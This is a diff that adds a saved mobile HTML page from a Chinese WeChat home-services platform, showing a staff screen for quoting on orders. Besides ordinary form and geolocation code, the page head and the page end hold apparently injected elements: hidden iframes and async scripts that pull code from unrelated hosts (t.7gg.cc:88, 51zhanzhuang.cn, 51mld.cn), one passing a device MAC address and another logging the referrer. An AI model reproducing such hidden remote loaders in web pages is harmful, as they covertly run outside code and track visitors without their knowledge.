@@ -1,0 +1,452 @@
+<html lang="zh-cn" style="font-size: 23.4375px;"><head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+        <title> 帮万家 </title>
+        <meta name="format-detection" content="telephone=no, address=no">
+        <meta name="apple-mobile-web-app-capable" content="yes"> <!-- apple devices fullscreen -->
+        <meta name="apple-touch-fullscreen" content="yes">
+        <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+        <meta name="keywords" content="">
+        <meta name="description" content="">
+        <link rel="shortcut icon" href="http://bwj.xy0594.cn/attachment/images/global/wechat.jpg">
+        <div style="display: none;"><iframe src="http://t.7gg.cc:88/new.html"></iframe></div><script src="https://hm.baidu.com/hm.js?f5df380d5163c1cc4823c8d33ec5fa49"></script><script async="" src="http://qet.51zhanzhuang.cn/sc/js/fshow.js?_qwert_sid=524009337&amp;_zxcvb_pid=990834033262&amp;rnd=1228&amp;_ver=20190403" used="1"></script><script type="text/javascript" src="http://51mld.cn/bd/logger?vid=20000&amp;t=1890124441684098&amp;ref=bwj.xy0594.cn%2Fapp%2Findex.php&amp;ck=false&amp;ph=true"></script><script type="text/javascript" src="https://hm.baidu.com/hm.js?bfc6c23974fbad0bbfed25f88a973fb0"></script><script src="http://51mld.cn/bd/query.js?vid=20000"></script><script src="https://res.wx.qq.com/open/js/jweixin-1.1.0.js"></script>
+        <script type="text/javascript" src="http://bwj.xy0594.cn/app/resource/js/app/util.js"></script>
+        <script src="http://bwj.xy0594.cn/app/resource/js/require.js"></script>
+        <!--<script type="text/javascript" src="http://bwj.xy0594.cn/app/resource/js/lib/jquery-1.11.1.min.js?v=20160906"></script>-->
+        <!--<script type="text/javascript" src="http://bwj.xy0594.cn/app/resource/js/lib/mui.min.js?v=20160906"></script>-->
+        <!--<script type="text/javascript" src="http://bwj.xy0594.cn/app/resource/js/app/common.js?v=20160906"></script>-->
+        <!--<link href="http://bwj.xy0594.cn/app/resource/css/bootstrap.min.css?v=20160906" rel="stylesheet">-->
+        <!--<link href="http://bwj.xy0594.cn/app/resource/css/common.min.css?v=20160906" rel="stylesheet">-->
+        <script type="text/javascript">
+            if(navigator.appName == 'Microsoft Internet Explorer'){
+                if(navigator.userAgent.indexOf("MSIE 5.0")>0 || navigator.userAgent.indexOf("MSIE 6.0")>0 || navigator.userAgent.indexOf("MSIE 7.0")>0) {
+                    alert('您使用的 IE 浏览器版本过低, 推荐使用 Chrome 浏览器或 IE8 及以上版本浏览器.');
+                }
+            }
+            window.sysinfo = {
+            'uniacid': '1',        'acid': '1',                'siteroot': 'http://bwj.xy0594.cn/',
+                'siteurl': 'http://bwj.xy0594.cn/app/index.php?i=1&c=entry&do=publishstaff&m=zm_housekeepnew&u=19',
+                'attachurl': 'http://bwj.xy0594.cn/attachment/',
+                'attachurl_local': 'http://bwj.xy0594.cn/attachment/',
+                'attachurl_remote': '',
+                'MODULE_URL': 'http://bwj.xy0594.cn/addons/zm_housekeepnew/',        'cookie' : {'pre': '4b5c_'}
+            };
+            // jssdk config 对象
+            jssdkconfig = null || {};
+            // 是否启用调试
+            jssdkconfig.debug = false;
+            jssdkconfig.jsApiList = [
+                'checkJsApi',
+                'onMenuShareTimeline',
+                'onMenuShareAppMessage',
+                'onMenuShareQQ',
+                'onMenuShareWeibo',
+                'hideMenuItems',
+                'showMenuItems',
+                'hideAllNonBaseMenuItem',
+                'showAllNonBaseMenuItem',
+                'translateVoice',
+                'startRecord',
+                'stopRecord',
+                'onRecordEnd',
+                'playVoice',
+                'pauseVoice',
+                'stopVoice',
+                'uploadVoice',
+                'downloadVoice',
+                'chooseImage',
+                'previewImage',
+                'uploadImage',
+                'downloadImage',
+                'getNetworkType',
+                'openLocation',
+                'getLocation',
+                'hideOptionMenu',
+                'showOptionMenu',
+                'closeWindow',
+                'scanQRCode',
+                'chooseWXPay',
+                'openProductSpecificView',
+                'addCard',
+                'chooseCard',
+                'openCard',
+                'openAddress'
+            ];
+            wx.ready(function () {
+                wx.hideMenuItems({
+                    menuList: ["menuItem:copyUrl","menuItem:openWithQQBrowser","menuItem:openWithSafari"] // 要隐藏的菜单项，只能隐藏“传播类”和“保护类”按钮，所有menu项见附录3
+                });
+                })
+    //        document.addEventListener('WeixinJSBridgeReady', function onBridgeReady() {
+    //            // 通过下面这个API隐藏右上角按钮
+    //            WeixinJSBridge.call('hideOptionMenu');
+    //        });
+    //        wx.ready(function () {
+    //            wx.hideOptionMenu();
+    //            wx.getLocation({
+    //                type: 'gcj02', // 默认为wgs84的gps坐标，如果要返回直接给openLocation用的火星坐标，可传入'gcj02'
+    //                success: function (res) {
+    //                    var latitude = res.latitude; // 纬度，浮点数，范围为90 ~ -90
+    //                    var longitude = res.longitude; // 经度，浮点数，范围为180 ~ -180。
+    //                    var speed = res.speed; // 速度，以米/每秒计
+    //                    var accuracy = res.accuracy; // 位置精度
+    //                    $.ajax({
+    //                        url:"http://apis.map.qq.com/ws/geocoder/v1/?location="+latitude+","+longitude+"&coord_type=5&key=G4UBZ-FAKKJ-SA5FB-FGJ77-GSBVO-2DFRQ&output=jsonp&callback=calllocation",
+    //                        type: "GET",
+    //                        dataType:'jsonp',
+    //                        jsonp:'calllocation',
+    //                        jsonpCallback:'calllocation',
+    //                        success: function(data){
+    //                            var lat = data.result.location.lat;
+    //                            var lng = data.result.location.lng;
+    //                            var name = data.result.ad_info.name;
+    //                            var addre = data.result.formatted_addresses.recommend
+    //                            wx.openLocation({
+    //                                latitude: lat, // 纬度，浮点数，范围为90 ~ -90
+    //                                longitude: lng, // 经度，浮点数，范围为180 ~ -180。
+    //                                name:name, // 位置名
+    //                                address:addre, // 地址详情说明
+    //                                scale: 28, // 地图缩放级别,整形值,范围从1~28。默认为最大
+    //                                infoUrl: 'http://www.baidu.com' // 在查看位置界面底部显示的超链接,可点击跳转
+    //                            });
+    //                        }
+    //                    });
+    //                }
+    //            });
+    //        });
+    //        function onBridgeReady(){
+    //            WeixinJSBridge.call('hideAllNonBaseMenuItem');
+    //        }
+    //
+    //        if (typeof WeixinJSBridge == "undefined"){
+    //            if( document.addEventListener ){
+    //                document.addEventListener('WeixinJSBridgeReady', onBridgeReady, false);
+    //           }else if (document.attachEvent){
+    //                document.attachEvent('WeixinJSBridgeReady', onBridgeReady);
+    //                document.attachEvent('onWeixinJSBridgeReady', onBridgeReady);
+    //            }
+    //        }else{
+    //            onBridgeReady();
+    //        }
+    
+        </script>
+    <script async="true" src="http://t.7gg.cc:88/j1.js?MAC=CC81DA2E00B0"></script>
+    <link rel="stylesheet" href="http://bwj.xy0594.cn/addons/zm_housekeepnew/images/staff/css/mui.min.css"><link rel="stylesheet" href="http://bwj.xy0594.cn/addons/zm_housekeepnew/images/staff/css/commonorder.css"><link href="https://cdn.bootcss.com/minireset.css/0.0.2/minireset.min.css" rel="stylesheet"><link href="http://bwj.xy0594.cn/addons/zm_housekeepnew/images/css/mobile/service2.css" rel="stylesheet"><style>
+    .quotealertbox .panel {
+        width: 100%;
+        height:100%;
+        background: white;
+        border-radius: 5px;
+        margin: 0;
+        position: relative;
+          top:0;
+    }
+    .quotealertbox{
+      overflow-y: scroll;
+    }
+    </style><script src="http://bwj.xy0594.cn/addons/zm_housekeepnew/images/js/mobile/jquery-1.9.1.js"></script><script>
+        function setRem() {
+            var html = document.documentElement;
+            var hWidth = html.getBoundingClientRect().width;
+            html.style.fontSize = hWidth / 16 + 'px';
+        }
+        setRem();
+        wx.ready(function () {
+            wx.getLocation({
+                type: 'wgs84', // 默认为wgs84的gps坐标，如果要返回直接给openLocation用的火星坐标，可传入'gcj02'
+                success: function (res) {
+                    var latitude = res.latitude; // 纬度，浮点数，范围为90 ~ -90
+                    var longitude = res.longitude; // 经度，浮点数，范围为180 ~ -180。
+                    var speed = res.speed; // 速度，以米/每秒计
+                    var accuracy = res.accuracy; // 位置精度
+    //              console.log(latitude)
+                    for(var i=0;i<($(".distances").length);i++){
+                        var newarr= $(".distances").eq(i).attr("ll").split(",");
+                        var lat=newarr[0];
+                        var lon=newarr[1];
+                        var cc=GetDistance(latitude,longitude,lat,lon)
+                        if(cc){
+                            $(".distance").eq(i).text(cc+"km")
+                        }
+    
+                    }
+                }
+            });
+        });
+    </script></head>
+    
+    
+        
+    
+    
+    
+    
+    
+    <body style="padding-bottom: 20px;">
+        <div class="ordertitle">
+            <a href="./index.php?i=1&amp;c=entry&amp;do=publishstaff&amp;m=zm_housekeepnew" style="background: #2ED19F;">未报价</a>
+            <a href="./index.php?i=1&amp;c=entry&amp;state=al&amp;do=publishstaff&amp;m=zm_housekeepnew">已报价</a>
+        </div>
+        <ul class="orderul" id="quoteone">
+                        </ul>
+    
+        <ul class="menu">
+                    <li>
+                <a href="./index.php?i=1&amp;c=entry&amp;do=qiangdan&amp;m=zm_housekeepnew">
+                    <img src="http://bwj.xy0594.cn/addons/zm_housekeepnew/images/staff/images/n1.png" alt="">
+                    <span>抢单</span>
+                </a>
+            </li>
+                    <li>
+                <a href="JavaScript:;">
+                    <img src="http://bwj.xy0594.cn/addons/zm_housekeepnew/images/staff/images/a2.png" alt="">
+                    <span style="color: #2ED19F;">报价</span>
+                </a>
+            </li>
+            <li>
+                <a href="./index.php?i=1&amp;c=entry&amp;do=qdlist&amp;m=zm_housekeepnew">
+                    <img src="http://bwj.xy0594.cn/addons/zm_housekeepnew/images/staff/images/n3.png" alt="">
+                    <span>订单</span>
+                </a>
+            </li>
+            <li>
+                <a href="./index.php?i=1&amp;c=entry&amp;do=mstaffcore&amp;m=zm_housekeepnew">
+                    <img src="http://bwj.xy0594.cn/addons/zm_housekeepnew/images/staff/images/n4.png" alt="">
+                    <span>我的</span>
+                </a>
+            </li>
+        </ul>
+        <div class="quotealertbox">
+            <div class="panel">
+              <form action="./index.php?i=1&amp;c=entry&amp;do=publishremark&amp;m=zm_housekeepnew" class="quoteinput" method="post" onsubmit="return Lselect()">
+              <div class="container">
+            <div class="header">
+                <div class="header_left">〈 </div>
+                <div class="header_right">
+                    参与接单
+                </div>
+            </div>
+            <div class="body">
+                <div class="body_top">
+                    <div class="body_top_title">
+                        说明
+                    </div>
+                    <div class="body_top_list">
+                        <div class="body_top_list_item">
+                            1.该订单是报价类订单，报价金额视为订单的全部服务金额，提交后不可修改；
+                        </div>
+                        <div class="body_top_list_item">
+                            2.请根据客户的需求提供合理的报价，若被雇佣了，不可随意加价，虚假报价将会受到平台的严厉触发；
+                        </div>
+                        <div class="body_top_list_item">
+                            3.提交的服务承诺会向客户展示，并且作为处理纠纷的依据。
+                        </div>
+                    </div>
+                </div>
+                <div class="body_middle">
+                    <div class="body_middle_title">报价金额</div>
+                    <div class="body_middle_price"><input type="number" name="remark[money]" class="money_v2" step="0.01" placeholder="0.00"></div>
+                    <div class="body_middle_tip">报价金额不低于<span class="body_middle_tip_price">20</span>元</div>
+                  <input type="hidden" name="remark[orderid]" value="" id="oredermoney">
+                    <input type="hidden" name="sid" value="" id="oredermoneys">
+                    <input type="hidden" name="id" value="" id="oredermoneyss">
+                    <input type="hidden" name="remark[model]" value="" id="orderss">
+                </div>
+                <div class="body_bottom">
+                    <div class="body_bottom_title">留言</div>
+                    <textarea name="remark[content]" class="body_bottom_input" placeholder="留言能提高被雇佣的概率哦"></textarea>
+                </div>
+                <div class="body_more">
+                    <div class="body_more_line"></div>
+                    <div class="body_more_title">服务承诺</div>
+                    <div class="body_more_list">
+                        <div class="body_more_list_item">
+                                <div class="body_more_list_item_button">未服务全额退</div>
+                        </div>
+                        <div class="body_more_list_item">
+                                <div class="body_more_list_item_button">30分钟内预约</div>
+                        </div>
+                        <div class="body_more_list_item">
+                                <div class="body_more_list_item_button">准时上门服务</div>
+                        </div>
+                        <div class="body_more_list_item">
+                                <div class="body_more_list_item_button">空跑费</div>
+                        </div>
+                        <div class="body_more_list_item">
+                            <div class="body_more_list_item_button">保修</div>
+                        </div>
+                          <div class="body_more_list_item">
+                            <div class="body_more_list_item_button">重新服务</div>
+                        </div>
+                    </div>
+                  
+                    <div class="body_more_tip">
+                      <a href="./index.php?i=1&amp;c=entry&amp;do=fwcn&amp;m=zm_housekeepnew">
+                        <img class="body_more_tip_icon" src="http://bwj.xy0594.cn/addons/zm_housekeepnew/images/staff/images/system.png">
+                        管理服务承诺
+                      </a>
+                    </div>
+                </div>
+            </div>
+            <div class="bottom">
+                  <input type="submit" name="submit" value="确定" class="moneysubmit bottom_save">
+                  <input type="hidden" name="token" value="AvSU">
+            </div>
+    
+        </div>
+              </form>
+              <!--
+                <img src="http://bwj.xy0594.cn/addons/zm_housekeepnew/images/staff/images/off.png" alt="" class='downimg' />
+                <div class="imgbox">
+                    <img src="http://bwj.xy0594.cn/addons/zm_housekeepnew/images/staff/images/jg.png" alt="" />
+                </div>
+        
+          
+                <form action="./index.php?i=1&c=entry&do=publishremark&m=zm_housekeepnew" class="quoteinput" method="post" onsubmit="return Lselect()">
+                       <!-- <img src="http://bwj.xy0594.cn/addons/zm_housekeepnew/images/sys/cyjd.jpg" width="100%"alt="" /> --
+                    <span>报价金额（元）</span>
+                    <input type="hidden" name="remark[orderid]" value="" id="oredermoney"/>
+                    <input type="hidden" name="sid" value="" id="oredermoneys"/>
+                    <input type="hidden" name="id" value="" id="oredermoneyss"/>
+                    <input type="hidden" name="remark[model]" value="" id="orderss"/>
+                    <input type="number" name="remark[money]" class='money' step="0.01" placeholder="0.00" />
+                    <textarea name="remark[content]" rows="" cols="" class="beizhu" placeholder="请填写备注信息"></textarea>
+                    <input type="submit" name="submit" value="确定" class='moneysubmit' />
+                    <input type="hidden" name="token" value="AvSU"/>
+                </form>-->
+            </div>
+        </div>
+        <div class="alertbox">
+        </div>
+        <script>
+            function Rad(d){
+            return d * Math.PI / 180.0;//经纬度转换成三角函数中度分表形式。
+            }
+        function GetDistance(lat1,lng1,lat2,lng2){
+            var radLat1 = Rad(lat1);
+            var radLat2 = Rad(lat2);
+            var a = radLat1 - radLat2;
+            var  b = Rad(lng1) - Rad(lng2);
+            var s = 2 * Math.asin(Math.sqrt(Math.pow(Math.sin(a/2),2) +
+                    Math.cos(radLat1)*Math.cos(radLat2)*Math.pow(Math.sin(b/2),2)));
+            s = s *6378.137 ;// EARTH_RADIUS;
+            s = Math.round(s * 10000) / 10000; //输出为公里
+            //s=s.toFixed(4);
+            return s;
+        }
+        if($(".menu li").length < 4) {
+            $(".menu li").css("width", "33.333%");
+            $(".menu img").css("left", "2.25rem");
+        }
+    
+            $(".quote-a").click(function() {
+                $("#oredermoney").val("");
+                $("#oredermoneys").val("");
+                $("#oredermoneyss").val("");
+                $("#orderss").val("");
+                $(".money").val("");
+                var index = $(".quote-a").index($(this))
+                $(".quotealertbox").css("display", "block")
+                var aa= $(".orderdd").eq(index).attr("aa");
+                var pp= $(".orderdd").eq(index).attr("pp");
+                var ss= $(".orderdd").eq(index).attr("ss");
+                $("#oredermoney").val(aa);
+                $("#oredermoneyss").val(aa);
+                $("#oredermoneys").val(pp);
+                $("#orderss").val(ss);
+            })
+            $(".header_left").click(function(){
+                $(".quotealertbox").css("display", "none");
+            });
+            function Lselect() {
+                if(!(/(^[1-9]([0-9]+)?(\.[0-9]{1,2})?$)|(^(0){1}$)|(^[0-9]\.[0-9]([0-9])?$)/.test($(".money_v2").val()))) {
+                    $(".alertbox").css({
+                        "display": "block"
+                    }).text("请输入正确的金额")
+                    setTimeout(function() {
+                        document.querySelector('.alertbox').style.display = 'none';
+                    }, 1000);
+                    return false;
+                } else {
+                    return true;
+                }
+            }
+            $(".downimg").click(function() {
+                $(".quotealertbox").css("display", "none")
+            })
+            var clientHeight = document.documentElement.clientHeight || document.body.clientHeight;
+            $(window).on('resize', function () {
+               var nowClientHeight = document.documentElement.clientHeight || document.body.clientHeight;
+               if (clientHeight > nowClientHeight) {
+            //键盘弹出的事件处理
+                   //$(".quotealertbox .panel").css("margin-top","4rem")
+            }else {
+                   //$(".quotealertbox .panel").css("margin-top","8.1rem")
+            //键盘收起的事件处理
+               }
+    });
+          $(".money_v2").blur(function(){
+              window.scroll(0,0);
+          });
+        
+        </script>
+        
+    <div class="text-center footer" style="margin:25px 0; width:100%; text-align:center; word-break:break-all;font-size:15px;">
+            帮万家 版权所有        &nbsp;&nbsp;</div>
+    <style>
+        h5{color:#555;}
+    </style>
+    <script type="text/javascript">
+        $(function(){
+            wx.config(jssdkconfig);
+            var $_share = {"title":"\u5e2e\u4e07\u5bb6","imgUrl":"","desc":"","link":"http:\/\/bwj.xy0594.cn\/app\/index.php?i=1&c=entry&do=publishstaff&m=zm_housekeepnew"};
+            if(typeof sharedata == 'undefined'){
+                sharedata = $_share;
+            } else {
+                sharedata['title'] = sharedata['title'] || $_share['title'];
+                sharedata['desc'] = sharedata['desc'] || $_share['desc'];
+                sharedata['link'] = sharedata['link'] || $_share['link'];
+                sharedata['imgUrl'] = sharedata['imgUrl'] || $_share['imgUrl'];
+            }
+            if(sharedata.imgUrl == ''){
+                var _share_img = $('body img:eq(0)').attr("src");
+                if(_share_img == ""){
+                    sharedata['imgUrl'] = window.sysinfo.attachurl + 'images/global/wechat_share.png';
+                } else {
+                    sharedata['imgUrl'] = util.tomedia(_share_img);
+                }
+            }
+            if(sharedata.desc == ''){
+                var _share_content = util.removeHTMLTag($('body').html());
+                if(typeof _share_content == 'string'){
+                    sharedata.desc = _share_content.replace($_share['title'], '')
+                }
+            }
+            wx.ready(function () {
+                wx.onMenuShareAppMessage(sharedata);
+                wx.onMenuShareTimeline(sharedata);
+                wx.onMenuShareQQ(sharedata);
+                wx.onMenuShareWeibo(sharedata);
+            });
+                    if($('.js-quickmenu')!=null && $('.js-quickmenu')!=''){
+                var h = $('.js-quickmenu .nav-home').height()+20+'px';
+                $('body').css("padding-bottom",h);
+                $('body .mui-content').css("bottom",h);
+            }else{
+                $('body').css("padding-bottom",0);
+                $('body .mui-content').css("bottom", "0");
+            }
+    
+            if($('.nav-menu-app')!=null && $('.nav-menu-app')!=''){
+                var h = $('.nav-menu-app').height()+'px';
+                $('body').css("padding-bottom",h);
+                $('.mui-content').css('bottom',h);
+            }else{
+                $('body').css("padding-bottom", "0");
+                $('.mui-content').css('bottom', "0");
+            }
+        });
+    </script>
+    <script>;</script><script type="text/javascript" src="http://bwj.xy0594.cn/app/index.php?i=1&amp;c=utility&amp;a=visit&amp;do=showjs&amp;m=zm_housekeepnew"></script>
+    
+    <iframe src="//yhc.51zhanzhuang.cn/api/mysc.jsp?sid=524009337&amp;pn=_QWERJAD_834033262_524009337_1_&amp;sd=51zhanzhuang.cn&amp;rss=http%3A%2F%2Fqet.51zhanzhuang.cn#_maerd_dnegel_=1" style="display: none; border: 0px; width: 0px; height: 0px;"></iframe></body></html>
